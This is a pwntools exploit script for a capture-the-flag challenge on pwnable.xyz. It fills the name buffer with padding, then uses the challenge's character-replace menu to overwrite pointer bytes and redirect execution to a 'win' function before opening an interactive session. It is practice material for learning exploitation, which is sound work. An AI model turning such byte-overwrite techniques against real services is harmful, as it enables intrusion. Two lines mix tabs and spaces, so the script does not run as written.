from pwn import *

#context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30015)

def play(val1,val2):
	s.recvuntil("> ")
	s.sendline("1")
	s.sendline(str(val1) + " " + str(val2))

def save(name):
	s.recvuntil("> ")
	s.sendline("2")
	s.recvuntil("Save name: ")
	s.sendline(name)

def delete(idx):
	s.recvuntil("> ")
        s.sendline("3")
	s.recvuntil("Save #: ")
	s.sendline(str(idx))

def edit_char(val1,val2):
	s.recvuntil("> ")
        s.sendline("5")
	s.recvuntil("Char to replace: ")
	s.sendline(val1)
	s.recvuntil("New char: ")
	s.sendline(val2)

win = 0x400CF3

pause()

s.recvuntil("Name: ")
s.send("A"*127)

for i in range(6):
	edit_char("c","a")

edit_char("\x6b","\xf3")
edit_char("\x0d","\x0c")

s.interactive()
